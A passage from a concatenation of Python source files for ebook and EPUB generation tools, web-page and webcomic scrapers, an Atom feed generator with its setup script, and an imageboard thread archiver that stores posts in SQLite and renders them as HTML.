        headings.extend(self.dom.find("h4"))
        headings.extend(self.dom.find("h5"))
        headings.extend(self.dom.find("h6"))

        for h in headings:
            heading_content = dhtmlparser.removeTags(h.getContent())
            heading_content = heading_content.strip()

            # remove unnecessary spaces
            heading_content = " ".join(heading_content.split())

            if heading_content:
                return heading_content

    @title.setter
    def title(self, new_title):
        self.__dict__["title"] = new_title

    @property
    def filename(self):
        if self.filename is not None:
            return self.filename

        if self.title:
            return safe_filename(self.title) + self._suffix

        return hashlib.md5(self.content).hexdigest() + self._suffix

    @filename.setter
    def filename(self, new_filename):
        self.__dict__["filename"] = new_filename

    def __repr__(self):
        return self.filename
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
from .chapter import Chapter


# Variables ===================================================================
# Functions & classes =========================================================
class MicroChapter(Chapter):
    def __init__(self, html):
        super(MicroChapter, self).__init__(html)
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
import unicodedata
from urlparse import urljoin

import requests


# Variables ===================================================================
# Functions & classes =========================================================
def to_absolute_url(link, base_url):
    if link.startswith("http://") or link.startswith("https://"):
        return link

    return urljoin(base_url, link)


def links_to_absolute_url(links, base_url):
    return [
        to_absolute_url(link, base_url)
        for link in links
    ]


def download(url):
    return requests.get(url).text.encode("utf-8")


def safe_filename(fn):
    fn = fn.decode("utf-8")
    fn = unicodedata.normalize('NFKD', fn).encode('ascii', 'ignore')
    fn = fn.replace(" ", "_")

    return "".join(
        char
        for char in fn
        if char.isalnum() or char in ".-_"
    )


def https_url(url):
    return url.replace("http://", "https://")
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
import hashlib


# Variables ===================================================================
# Functions & classes =========================================================
class Image(object):
    def __init__(self, content, filename=None):
        self.content = content
        self.filename = filename

    def get_filename(self):
        if self.filename:
            return self.filename

        return hashlib.md5(self.content).hexdigest()  # TODO: suffix from mime
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================



# Variables ===================================================================



# Functions & classes =========================================================



# Main program ================================================================
if __name__ == '__main__':
    pass
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
import os
import os.path

import pytest
import dhtmlparser

from ebook_serializer import toc_guesser


# Functions & classes =========================================================
def data_context(fn):
    local_path = os.path.dirname(__file__)

    return os.path.join(local_path, "data", fn)


def read_data_context(fn):
    with open(data_context(fn)) as f:
        return f.read()


@pytest.fixture
def toc_example():
    return read_data_context("toc_example.html")


@pytest.fixture
def toc_links():
    return read_data_context("toc_links.txt").splitlines()


# Tests =======================================================================
def test_number_of_links():
    dom = dhtmlparser.parseString(
        """
        <root>
            <a />
            <sub>
                <a />
            </sub>
        </root>
        """
    )

    assert toc_guesser._number_of_links(dom) == 2
    assert toc_guesser._number_of_links(dom.find("sub")[0]) == 1


def test_parent_iterator():
    dom = dhtmlparser.parseString(
        """
        <root>
            <a />
            <sub>
                <a attr=1 />
            </sub>
        </root>
        """
    )
    dhtmlparser.makeDoubleLinked(dom)

    a_tag = dom.find("a", {"attr": "1"})[0]
    assert a_tag

    parents = list(toc_guesser._parent_iterator(a_tag))
    assert parents

    assert parents == [
        dom.find("sub")[0],
        dom.find("root")[0],
        dom
    ]


def test_identify_jump():
    test_set = [
        (1, None),
        (5, None),
        (50, "here"),
        (51, None),
        (54, None),
    ]

    assert toc_guesser._identify_jump(test_set) == "here"


def test_guess_toc_element(toc_example):
    toc = toc_guesser.guess_toc_element(toc_example)
    dom = dhtmlparser.parseString(toc_example)

    assert toc.__str__() == dom.find("dl")[0].__str__()


def test_guess_toc_links(toc_example, toc_links):
    assert toc_guesser.guess_toc_links(toc_example) == toc_links
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
import pytest

from ebook_serializer.components.tools import to_absolute_url
from ebook_serializer.components.tools import links_to_absolute_url

from ..test_toc_guesser import toc_links
from ..test_toc_guesser import read_data_context


# Variables ===================================================================
BASE_URL = "http://pharo.gemtalksystems.com"


# Fixtures ====================================================================
@pytest.fixture
def abs_toc_links():
    return read_data_context("absolute_toc_links.txt").splitlines()


# Tests =======================================================================
def test_to_absolute_url():
    absolute_url = "http://pharo.gemtalksystems.com/book/table-of-contents/"
    relative_url = "./book/table-of-contents/"  # notice the ./

    assert absolute_url == to_absolute_url(
        relative_url,
        base_url=BASE_URL
    )


def test_links_to_absolute_url(toc_links, abs_toc_links):
    abs_links = links_to_absolute_url(toc_links, base_url=BASE_URL)

    assert abs_links == abs_toc_links
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
from ebook_serializer import EpubBook


# Variables ===================================================================



# Functions & classes =========================================================


# Main program ================================================================
if __name__ == '__main__':
    book = EpubBook()

    book.title = "Self Tutorial"
    book.sub_title = "Prototype-Based Application Construction Using SELF 4.0"
    book.authors = [
        "Mario Wolczko",
        "Randall B. Smith",
    ]
    book.year = "1996"

    import shutil
    shutil.move(
        book.to_epub(),
        "."
    )
#! /usr/bin/env python3
import requests
import dhtmlparser


BASE_URL = "https://ruslanspivak.com"
SOURCE_URL = BASE_URL + "/lsbasi-part1/"


def gather_toc_urls():
    r = requests.get(SOURCE_URL)
    dom = dhtmlparser.parseString(r.text)
    dhtmlparser.makeDoubleLinked(dom)

    def find_toc_ul_tag(el):
        all_a = el.find("a")

        def all_lsbasi_links(links):
            return all(
                x.params.get("href", "").startswith("/lsbasi-")
                for x in links
            )

        return all_lsbasi_links(all_a) and len(all_a) >= 12

    result = dom.find("ul", fn=find_toc_ul_tag)

    return [
        BASE_URL + r.params["href"]
        for r in result[0].find("a")
    ]


if __name__ == '__main__':
    print(gather_toc_urls())#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
import os
import uuid
import os.path
import mimetypes
from string import Template


# Variables ===================================================================
COVER_TEMPLATE = """<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<title>Cover</title>
<meta content="urn:uuid:$uid" name="Adept.expected.resource"/>
</head>
<body>
<a id="cover"/>
<img alt="cover" src="$path" style="height: 100%;"/>
</body>
</html>"""

TOC_TEMPLATE = """<?xml version="1.0"?>
<!DOCTYPE ncx PUBLIC "-//NISO//DTD ncx 2005-1//EN" "http://www.daisy.org/z3986/2005/ncx-2005-1.dtd">
<ncx xmlns="http://www.daisy.org/z3986/2005/ncx/" version="2005-1">
<head>
<meta name="$title" content=""/>
</head>
<docTitle>
<text>$title</text>
</docTitle>
<navMap>
$content
</navMap>
</ncx>
"""

NAV_POINT_TEMPLATE = """
<navPoint id="navpoint-$cnt" playOrder="$cnt">
<navLabel>
<text>$title</text>
</navLabel>
<content src="$filename"/>
</navPoint>
"""

CONTENT_TEMPLATE = """<?xml version="1.0"?>
<package version="2.0" xmlns="http://www.idpf.org/2007/opf" unique-identifier="BookId">
<metadata xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:opf="http://www.idpf.org/2007/opf">
<dc:title>--TITLE--</dc:title>
<dc:creator>--AUTHOR--</dc:creator>
<dc:publisher>--PUBLISHER--</dc:publisher>
<dc:format/>
<dc:date>--DATE-AS-"YYYY-MM-DD"--</dc:date>
<dc:subject/>
<dc:description/>
<dc:rights/>
<dc:language>en</dc:language>
<dc:identifier id="BookId" opf:scheme="ISBN">--ISBN--</dc:identifier>
<meta content="cover" name="cover"/>
</metadata>

<manifest>
<item href="toc.ncx" id="ncx" media-type="application/x-dtbncx+xml"/>
$manifest
</manifest>

<spine toc="ncx">
$spine
</spine>

<guide>
<reference href="$covername" title="Cover" type="cover"/>
<reference href="$tocname" title="Table of Contents" type="toc"/>
</guide>
</package>
"""

ITEM_TEMPLATE = '<item href="$path" id="$id" media-type="$mime"/>'
ITEMREF_TEMPLATE = '<itemref idref="$id" linear="yes"/>\n'


# Functions & objects =========================================================
def _get_id(fn):
    return os.path.basename(
        fn.replace(".", "_")
    )

def _filename_to_int(fn):
    splitted = fn.replace(".", "_").replace("-", "_").split("_")

    digits = filter(lambda x: x.isdigit(), splitted)

    if not digits:
        return 0

    return int(digits[0])


def gen_cover(path, uid=None):
    if not uid:
        uid = str(uuid.uuid4())

    return Template(COVER_TEMPLATE).substitute(uid=uid, path=path)


def gen_toc_ncx(title, chapters):
    content = ""

    chapters = sorted(chapters, key=lambda x: _filename_to_int(x.filename))
    for cnt, chapter in enumerate(chapters):
        if chapter.title == "":
            continue

        content += Template(NAV_POINT_TEMPLATE).substitute(
            title=chapter.title,
            filename=chapter.filename,
            cnt=cnt
        )

    return Template(TOC_TEMPLATE).substitute(title=title, content=content)


def gen_content_opf(chapters, cover, toc, img_dir):
    blacklist = set([
        "toc.ncx",
        "epub.pyc"
    ])

    files = filter(
        lambda x: os.path.isfile(x) and x not in blacklist,
        os.listdir(".")
    )
    images = map(lambda x: os.path.join(img_dir, x), os.listdir(img_dir))
    images = filter(lambda x: os.path.isfile(x), images)

    # create manifest with links to all files
    manifest = map(
        lambda fn: Template(ITEM_TEMPLATE).substitute(
            path=fn,
            mime=mimetypes.guess_type(fn)[0],
            id=_get_id(fn)
        ),
        images + files
    )
    manifest = "\n".join(manifest)

    # text/html is not appropriate for XHTML/OPS, use application/xhtml+xml
    # instead (don't ask..)
    manifest = manifest.replace("text/html", "application/xhtml+xml")

    # create spine
    chapters = sorted(chapters, key=lambda x: _filename_to_int(x.filename))

    spine = ""
    for chapter in chapters:
        spine += Template(ITEMREF_TEMPLATE).substitute(
            id=_get_id(chapter.filename),
        )

    return Template(CONTENT_TEMPLATE).substitute(
        manifest=manifest,
        spine=spine,
        covername=cover.filename,
        tocname=toc.filename
    )
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
import os
import os.path
import urllib2  # for HTTPError
import httplib  # for BadStatusLine
import mimetypes

import httpkie
import dhtmlparser

import epub


# Configuration ===============================================================
BASE_URL = "http://www.cs.ubc.ca/~poole/aibook/html/"
TOC_URL = "http://www.cs.ubc.ca/~poole/aibook/html/ArtInt.html"
COVER_URL = "https://raw.githubusercontent.com/Bystroushaak/Artificial-Intelligence-epub/master/9780521519007.jpg"
IMAGES = "images"
COVER_FN = "book_cover.xhtml"


# Variables ===================================================================
DOWNER = httpkie.Downloader()
TOC_FN = "toc.ncx"  # don't change this
CONTENT_FN = "content.opf"  # don't change this
CONTENT_TEMPLATE = """<?xml version="1.0" encoding="UTF-8"?>
<html xmlns="http://www.w3.org/1999/xhtml">
<body>
%s
</body>
</html>"""
URL_CACHE = set()


# Functions & objects =========================================================
class Content(object):
    def __init__(self, url, filename=None):
        self.skip_this = False
        self.subcontents = []

        # parse url
        if "#" in url:
            url = url.split("#")[0]

        if "http" not in url:
            url = os.path.join(BASE_URL, url)
            # url = os.path.normpath(url)

        self.url = url

        # parse filename
        if not filename:
            filename = os.path.basename(url)
        self.filename = filename

        # check cache
        global URL_CACHE
        if url in URL_CACHE or " " in url:
            self.skip_this = True
            # print "\tSkipping", self.url
            return
        else:
            URL_CACHE.add(url)

        print url

        try:
            self.content = self.get_content()
        except (urllib2.HTTPError, httplib.BadStatusLine, TypeError):
            self.skip_this = True
            print "\tSkipping", self.url

    def get_content(self):
        return DOWNER.download(self.url)

    def get_mimetype(self):
        return mimetypes.guess_type(self.url)[0]

    def get_sub_contents(self):
        return []


class Image(Content):
    def __init__(self, url, filename=None):
        super(Image, self).__init__(url, filename)
        
        if not filename:
            filename = url.split("/")

            if len(filename) > 2:
                self.filename = "_".join(filename[-2:])

    @property
    def filename(self):
        return os.path.join(IMAGES, self.__dict__["filename"])

    @filename.setter
    def filename(self, fn):
        self.__dict__["filename"] = fn


class Text(Content):
    def __init__(self, url, filename=None):
        self.title = ""
        super(Text, self).__init__(url, filename)

    def _parse_sub_contents(self, dom):
        for image in dom.find("img"):
            self.subcontents.append(
                Image(image.params["src"])
            )
            image.params["src"] = self.subcontents[-1].filename

        for link in dom.find("a"):
            if "href" not in link.params:
                continue

            link = link.params["href"]

            if "://" in link or link.startswith("www"):
                continue

            self.subcontents.append(
                Text(link)
            )

            # add also subcontents of subcontents
            self.subcontents.extend(
                self.subcontents[-1].get_sub_contents()
            )

    def get_content(self):
        content = super(Text, self).get_content()

        dom = dhtmlparser.parseString(content)
        main = dom.find("div", {"id": "main"})

        self.title = dom.find("title")[0].getContent()
        self.title = self.title.split("--")[-1].strip()

        if not main:
            return content

        self._parse_sub_contents(main[0])

        return CONTENT_TEMPLATE % main[0].getContent()

    def get_sub_contents(self):
        # skip items that were already in URL_CACHE
        return filter(lambda x: not x.skip_this, self.subcontents)


class TOC(Text):
    def _parse_sub_contents(self, dom):
        for link in dom.match("li", "a"):
            self.subcontents.append(
                Text(link.params["href"])
            )


# Main program ================================================================
if __name__ == '__main__':
    if not os.path.exists(IMAGES):
        os.mkdir(IMAGES)

    toc = TOC(TOC_URL)
    cover = Image(COVER_URL)
    package = [
        toc,
        cover,
    ]

    chapters = toc.get_sub_contents()

    images = []
    for chapter in chapters:
        package.extend(chapter.get_sub_contents())

    package.extend(chapters)

    # save everything to disk
    print "Saving to disk.."
    for item in package:
        with open(item.filename, "wb") as f:
            f.write(item.content)

    # create cover for book
    cover_obj = Text(COVER_FN, COVER_FN)  # used to hold object with cover data
    cover_obj.title = "Cover"

    cover_xml = epub.gen_cover(cover.filename)
    with open(COVER_FN, "w") as f:
        f.write(cover_xml)

    # create toc.ncx
    print "Generating '%s'.." % TOC_FN

    chapters = filter(lambda x: isinstance(x, Text), package)

    toc_xml = epub.gen_toc_ncx(
        toc.title,
        [cover_obj] + chapters
    )
    with open(TOC_FN, "w") as f:
        f.write(toc_xml)

    # create content.opf
    print "Generating '%s'.." % CONTENT_FN

    content_xml = epub.gen_content_opf(
        [cover_obj] + chapters,
        cover_obj,
        toc,
        IMAGES
    )
    with open(CONTENT_FN, "w") as f:
        f.write(content_xml)

    print "Done. Don't forget to update metadata section in '%s'." % CONTENT_FN
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
import time
import shelve
import urlparse
from collections import OrderedDict
from contextlib import contextmanager

import requests
import dhtmlparser

from ebook_serializer import EpubBook
from ebook_serializer import toc_guesser


# Variables ===================================================================
BASE_URL = "http://pharo.gemtalksystems.com"


# Functions & classes =========================================================
@contextmanager
def shelver(fn):
    """
    In python 2.7, there is no context manager for shelve. So this is it.
    """
    db = shelve.open(fn)
    yield db
    db.close()


def download(url):
    data = requests.get(url).text

    return data.encode("utf-8")


def to_absolute_url(link):
    if "://" in link:
        return link

    return urlparse.urljoin(BASE_URL, link)


def link_cleaner(link):
    return link.split("#")[0].split("?")[0]


def https_url(url):
    return url.replace("http://", "https://")


def get_toc_links():
    toc_url = BASE_URL + "/pier/book/table-of-contents"

    toc_page = download(toc_url)
    links = toc_guesser.guess_toc_links(
        toc_page,
        BASE_URL
    )

    # remove the session shit from the end of the URL
    return [
        link_cleaner(link)
        for link in links
        if link.startswith(BASE_URL) or link.startswith(https_url(BASE_URL))
    ]


class ContentDownloader(object):
    def __init__(self, url, links):
        self.url = url
        self.links = links

        self.shelve_db_fn = "content_downloader_chache.shelve"
        self.download_cache = None
        self.cropped_cache = None
        self.img_cache = None
        self.style_cache = None

    def _download_links(self):
        for link in self.links:
            if link not in self.download_cache:
                self.log("Downloading %s" % link)
                self.download_cache[link] = download(link)  # TODO: handle errors

    def crop_content(self, content, dom):
        body = dom.find("body")

        if not body:
            return content

        return body[0].getContent()

    def find_images(self, content, dom):
        return [
            to_absolute_url(img.params["src"])
            for img in dom.find("img")
            if img.params.get("src", None)
        ]

    def find_styles(self, content, dom):
        style_elements = [
            to_absolute_url(style.params["href"])
            for style in dom.find("style")
            if "href" in style.params
        ]

        link_elements = [
            to_absolute_url(style.params["href"])
            for style in dom.find("link", {"rel": "stylesheet"})
            if "href" in style.params
        ]

        link_elements2 = [
            to_absolute_url(style.params["href"])
            for style in dom.find("link", {"type": "text/css"})
            if "href" in style.params
        ]

        return style_elements + link_elements + link_elements2

    def link_on_banlist(self, link):
        if not (link.startswith(self.url) or
                link.startswith(https_url(self.url))):
            return True

        suffix = link.rsplit(".")[-1]
        if suffix in {"zip", "rar", "gz", "tar"}:
            return True

        return False

    def _find_links(self, content, dom):
        all_links = (
            to_absolute_url(link.params["href"])
            for link in dom.find("a")
            if link.params.get("href", None)
        )

        # filter links on banlist
        return [
            link
            for link in all_links
            if not self.link_on_banlist(link)
        ]

    def run(self, crop_content=None, link_editor=lambda x: x):
        if not crop_content:
            crop_content = self.crop_content

        self._download_links()

        not_downloaded = []
        for url, content in self.download_cache.iteritems():
            # skip already processed items
            if url in self.cropped_cache:
                continue

            dom = dhtmlparser.parseString(content)

            # crop the text to area of interest
            cropped_content = crop_content(content=content, dom=dom)
            cropped_dom = dhtmlparser.parseString(content)

            # find styles
            for style_url in self.find_styles(content, dom):
                style_url = link_editor(style_url)
                if style_url not in self.style_cache:
                    self.log("Downloading style %s" % style_url)
                    self.style_cache[style_url] = download(style_url)

            # find images
            for img_url in self.find_images(cropped_content, cropped_dom):
                img_url = link_editor(img_url)
                if img_url not in self.img_cache:
                    self.log("Downloading image %s" % img_url)
                    self.img_cache[img_url] = download(img_url)

            not_downloaded.extend(
                link_editor(link)
                for link in self._find_links(cropped_content, cropped_dom)
            )
            self.cropped_cache[url] = cropped_content

        if not_downloaded:
            self.links.extend(not_downloaded)
            return self.run(
                crop_content=crop_content,
                link_editor=link_editor
            )

    def log(self, what):
        print what

    # TODO: rewrite to dynamic parsing from __dict__
    def load(self):
        with shelver(self.shelve_db_fn) as db:
            self.url = db.get("url", None) or self.url
            self.links = db.get("links", None) or self.links
            self.download_cache = db.get("download_cache", OrderedDict())
            self.cropped_cache = db.get("cropped_cache", OrderedDict())
            self.img_cache = db.get("img_cache", OrderedDict())
            self.style_cache = db.get("style_cache", OrderedDict())

    def save(self):
        with shelver(self.shelve_db_fn) as db:
            db["url"] = self.url
            db["links"] = self.links
            db["download_cache"] = self.download_cache
            db["cropped_cache"] = self.cropped_cache
            db["img_cache"] = self.img_cache
            db["style_cache"] = self.style_cache


# Main program ================================================================
if __name__ == '__main__':
    book = EpubBook()
    book.title = "Pharo - the collaborActive book"
    book.published = time.time()

    cd = ContentDownloader(
        url=BASE_URL,
        links=get_toc_links(),
    )
    cd.load()

    try:
        cd.run(link_editor=link_cleaner)
    finally:
        cd.save()

    # import code
    # code.interact(None, None, locals())

    # import shutil
    # shutil.move(
    #     book.to_epub(),
    #     "."
    # )
import time
from urllib.parse import urljoin

import requests
import dateparser
from pyatom import AtomFeed
from bs4 import BeautifulSoup


def get_striplist(circuit_breaker=5):
    if circuit_breaker <= 0:
        raise ValueError('Can\'t parse index page!')

    resp = requests.get('http://www.blastwave-comic.com')
    resp.raise_for_status()

    soup = BeautifulSoup(resp.text)

    select_tags = soup.find_all('select', attrs={'name': 'nro'})
    if not select_tags:
        time.sleep(15)
        return get_striplist(circuit_breaker - 1)

    options = select_tags[0].find_all('option')

    episode_pairs = [
        (int(option['value']), option.text)
        for option in options
        if option.get('value', '').isdigit()
    ]

    return episode_pairs


def image_link_from_comic_number(comic_number):
    resp = requests.get('http://www.blastwave-comic.com/index.php?p=comic&nro=%d' % comic_number)
    resp.raise_for_status()

    soup = BeautifulSoup(resp.text)

    images = [
        img for img in soup.find_all("img")
        if 'comics/' in img.get('src', '')
    ]

    if not images:
        raise ValueError('No image found for comic number %d!' % comic_number)

    return urljoin('http://www.blastwave-comic.com', images[0]['src'])


def get_date_from_image(img_url):
    resp = requests.head(img_url)

    date_str = resp.headers['Last-Modified']

    return dateparser.parse(date_str)


def generate_atom_feed():
    striplist = sorted(get_striplist())

    last_five_strips = reversed(striplist[-5:])

    feed = AtomFeed(
        title="Gone with the Blastwave",
        subtitle="Unofficial feed for the GWTB comics.",
        feed_url="https://github.com/Bystroushaak/gwtb_atom_generator",
        url="http://www.blastwave-comic.com/",
        author="Bystroushaak"
    )

    for comic_id, title in last_five_strips:
        image_link = image_link_from_comic_number(comic_id)
        date = get_date_from_image(image_link)

        feed.add(
            title=title,
            # content="Body of my post",
            # content_type="text",
            author='GWTB',
            url='http://www.blastwave-comic.com/index.php?p=comic&nro=%d' % comic_id,
            updated=date
        )

    return feed.to_string()


def main():
    print(generate_atom_feed())
from setuptools import setup, find_packages
from codecs import open
from os import path

__version__ = '0.0.3'

here = path.abspath(path.dirname(__file__))

# Get the long description from the README file
with open(path.join(here, 'README.md'), encoding='utf-8') as f:
    long_description = f.read()

# get the dependencies and installs
with open(path.join(here, 'requirements.txt'), encoding='utf-8') as f:
    all_reqs = f.read().split('\n')

install_requires = [x.strip() for x in all_reqs if 'git+' not in x]
dependency_links = [x.strip().replace('git+', '') for x in all_reqs if x.startswith('git+')]

setup(
    name='gwtb_atom_generator',
    version=__version__,
    description='Gone with the Blastwave Atom feed generator.',
    long_description=long_description,
    url='https://github.com/Bystroushaak/gwtb_atom_generator',
    download_url='https://github.com/Bystroushaak/gwtb_atom_generator/tarball/' + __version__,
    license='MIT',
    classifiers=[
      'Development Status :: 3 - Alpha',
      'Intended Audience :: Developers',
      'Programming Language :: Python :: 3',
    ],
    keywords='',
    packages=find_packages(exclude=['docs', 'tests*']),
    include_package_data=True,
    author='Bystroushaak',
    install_requires=install_requires,
    dependency_links=dependency_links,
    author_email='bystrousak@kitakitsune.org',
    entry_points = {
        'console_scripts': [
            'gwtb_atom_generator = gwtb_atom_generator:main',
        ],
    },
)
#!/usr/bin/env python
# -*- coding: utf-8 -*-
__name    = "7chan backupper"
__version = "1.0.0"
__date    = "25.11.2012"
__author  = "Bystroushaak"
__email   = "bystrousak@kitakitsune.org"
#
# Interpreter version: python 2.7
# by Bystroushaak (bystrousak@kitakitsune.org)
# This work is licensed under a Creative Commons 3.0 
# Unported License (http://creativecommons.org/licenses/by/3.0/).
# Created in Sublime text 2 editor.
#
#= Imports =====================================================================
import os
import sys
import time
import urllib
import urllib2
import os.path
import argparse
from sqlite3 import dbapi2 as sqlite


import mfn
from kusaba import *



#= Variables ===================================================================
RESOURCES_DIR = "resources"
DATA_DIR      = "data"

TEMPLATE_FN   = RESOURCES_DIR + "/template.html"
DB_FN_SUFFIX  = "database.sqlite"

TEMPLATE      = open(TEMPLATE_FN).read()



#= Functions & objects =========================================================
def version():
	"Show version."
	return __name + " v" + __version + " (" + __date + ") by " + __author + " (" + __email + ")"


def write(s):
	sys.stdout.write(str(s))
	sys.stdout.flush()
def writeln(s):
	write(str(s) + "\n")


def serializePost(p):
	"Serialize post to HTML. Returns string."

	return str(
		"<table class='post' id='" + p.post_id + "'>\n" + 
		"  <tr><td width='100px'>Author: </td><td><span class='author'>"  + p.author       + "</span></td></tr>\n" +
		"  <tr><td>Email:  </td><td><span class='email'>"   + str(p.email)   + "</span></td></tr>\n" +
		"  <tr><td>Time:   </td><td><span class='time'>"    + p.time         + "</span></td></tr>\n" +
		"  <tr><td>Subject:</td><td><span class='subject'>" + str(p.subject) + "</span></td></tr>\n" +
		"  <tr><td colspan='2'><div class='text'>\n" + 
		      p.text.strip() + "\n" +
		"  </div></td></tr>\n" +
		"  <tr><td colspan='2'>\n" +
		"\n".join(map(
			lambda x: 
			"    <span class='file'>\n" +
			"      <a class='file' href='" + x["file"] + "'><img class='thumb' src='" + x["thumb"] + "'></a>\n" +
			"    </span>\n",
			p.files
		)) + 
		"  </td></tr>\n" +
		"</table>\n"
	)


def downloadFiles(path, posts):
	for p in posts:
		for f in p.files:
			fn = "files/" + os.path.basename(f["file"])
			tn = "thumbs/" + os.path.basename(f["thumb"])

			success = True
			if not os.path.exists(path + fn):
				fh = open(path + fn, "wb")
				try:
					fh.write(web.getPage(f["file"]))
				except urllib2.HTTPError:
					success = False
					fh.close()
					os.remove(path + fn)
				fh.close()
			if success:
				f["file"] = fn

			success = True
			if not os.path.exists(path + tn):
				fh = open(path + tn, "wb")
				try:
					fh.write(web.getPage(f["thumb"]))
				except urllib2.HTTPError:
					success = False
					fh.close()
					os.remove(path + tn)
				fh.close()
			if success:
				f["thumb"] = tn

	return posts


def threadToHTML(thread_id, posts):
	if len(posts) > 0 and posts[0].subject.strip() != "":
		title = posts[0].subject + " - thread id " + str(thread_id)
	else:
		title = "Thread id " + str(thread_id)

	o = "<h1>" + title + "</h1>\n\n"

	for p in posts:
		o += serializePost(p) + "\n"

	t = TEMPLATE
	t = t.replace("{content}", o)
	t = t.replace("{title}", title)

	return t


def initDatabase(fn):
	create_tables = False
	if not os.path.exists(fn):
		create_tables = True

	db = sqlite.connect(fn)
	db.text_factory = str

	if create_tables:
		db.executescript("""
			CREATE TABLE Threads(
				thread_id INTEGER PRIMARY KEY,
				first_post_id  INTEGER,
				last_post_timestamp INTEGER
			);
			CREATE TABLE Posts(
				post_id INTEGER PRIMARY KEY, 
				thread_id INTEGER,
				author TEXT,
				email TEXT,
				subject TEXT,
				text TEXT,
				time TEXT
			);
			CREATE TABLE Files(
				post_id INTEGER,
				filename TEXT,
				thumb TEXT,
				PRIMARY KEY (post_id, filename, thumb)
			);
		""")

		db.commit()

	return db


def saveThreadToDatabase(db, thread_id, posts):
	if len(posts) == 0:
		return

	# 12/11/09(Fri)03:06 -> 12/11/09 03:06
	last_time = posts[-1].time.strip().split("(") 
	last_time = last_time[0] + " " + last_time[1].split(")")[1]
	
	# string to timestamp
	last_post_timestamp = time.strptime(last_time, "%y/%m/%d %H:%M")
	last_post_timestamp = int(time.strftime("%s", last_post_timestamp))


	db.execute(
		"INSERT OR REPLACE INTO Threads (thread_id, first_post_id, last_post_timestamp) VALUES(?, ?, ?)",
		(thread_id, posts[0].post_id, last_post_timestamp)
	)

	for p in posts:
		db.execute(
			"""
			INSERT OR REPLACE INTO Posts (
				post_id,
				thread_id,
				author,
				email,
				subject,
				text,
				time
			) VALUES (?, ?, ?, ?, ?, ?, ?)
			""",
			(
				p.post_id,
				thread_id,
				p.author,
				p.email,
				p.subject,
				p.text,
				str(p.time)
			)
		)

		for f in p.files:
			db.execute(
				"INSERT OR REPLACE INTO Files(post_id, filename, thumb) VALUES(?, ?, ?)",
				(p.post_id, f["file"], f["thumb"])
			)

	db.commit()


def boardToHTML(db, board_name):
	title = board_name + " index"

	# get first post from every thread
	result = db.execute("""
		SELECT * FROM Posts
		INNER JOIN Threads
		WHERE Posts.post_id = Threads.first_post_id
		ORDER BY Threads.last_post_timestamp DESC
	""")

	# process databse request
	threads_posts = []
	for d in result.fetchall():
		post = Post()
		post.post_id = str(d[0])
		thread_id    = str(d[1])
		post.author  = str(d[2])
		post.email   = str(d[3])
		post.subject = str(d[4])
		post.text    = str(d[5])
		post.time    = str(d[6])

		post.files = []
		for f, t in db.execute("SELECT filename, thumb FROM Files WHERE post_id = ?", 
			(post.post_id,)).fetchall():

			post.files.append({"file" : f, "thumb" : t})

		threads_posts.append([str(thread_id) + ".html", post])

	o = "<h1>" + title + "</h1>\n\n"
	for t, p in threads_posts:
		o += "<a href='" + t + "'>\n"
		o += serializePost(p) + "\n"
		o += "</a>\n\n"

	t = TEMPLATE
	t = t.replace("{content}", o)
	t = t.replace("{title}", title)

	return t


def parseArgs():
	parser = argparse.ArgumentParser(description = "7chan backupper")

	# required arguments
	parser.add_argument("-p", "--proxy", metavar="hostname:port", action="store", default="", type=str, help="SOCKS5 proxy adress. ")
	parser.add_argument("-v", "--version", action="store_true", default=False, help="Show version.")
	parser.add_argument("-q", "--quiet", action="store_true", default=False, help="Show debug output.")
	parser.add_argument("board", action="store", default="", help="Board's shortcut. /pr/ for example.")
	args = parser.parse_args()

	# process arguments
	if args.version:
		writeln(version())
		sys.exit(0)

	verbose = not args.quiet

	board_name = args.board
	if board_name.strip() == "":
		sys.exit(0)
	if not board_name.startswith("/"):
		board_name = "/" + board_name
	if not board_name.endswith("/"):
		board_name += "/"

	# install proxy
	if args.proxy.strip() != "":
		p_tmp = args.proxy.split(":")
		port = 0
		hostname = ""
		try:
			hostname = p_tmp[0]
			port = int(p_tmp[1])
		except Exception, e:
			sys.stderr.write(str(e) + "\n")
			sys.exit(1)
		
		mfn.IP.installProxy(hostname, port)

	return verbose, board_name



#= Main program ================================================================

def main():
	k = Kusaba("https://7chan.org")

	verbose, board_name = parseArgs()
	board_dir           = DATA_DIR + board_name

	# ensure output directory exists
	if verbose:
		write("Creating directory structure .. ")
	if not os.path.exists(board_dir):
		os.makedirs(board_dir)
	if not os.path.exists(board_dir + "thumbs"):
		os.makedirs(board_dir + "thumbs")
	if not os.path.exists(board_dir + "files"):
		os.makedirs(board_dir + "files")
	if verbose:
		writeln("done.")


	# mount database, create it if not exists
	if verbose:
		write("Initializing database .. ")
	db = initDatabase(board_dir + board_name.replace("/", "") + "_board_" + DB_FN_SUFFIX)
	if verbose:
		writeln("done.")


	# process all threads in board
	if verbose:
		writeln("Mirroring threads in " + board_name + ":")
	for thread in k.getThreadList(board_name):
		if verbose:
			write("  Thread id " + str(thread.thread_id) + " .. posts")

		posts  = thread.getPosts()

		if verbose:
			write(" .. files")

		# dowload attachments
		posts = downloadFiles(board_dir, posts)

		if verbose:
			write(" .. html out")

		# serialize to html
		fh = open(board_dir + str(thread.thread_id) + ".html", "wt")
		fh.write(threadToHTML(thread.thread_id, posts))
		fh.close()

		# copy css
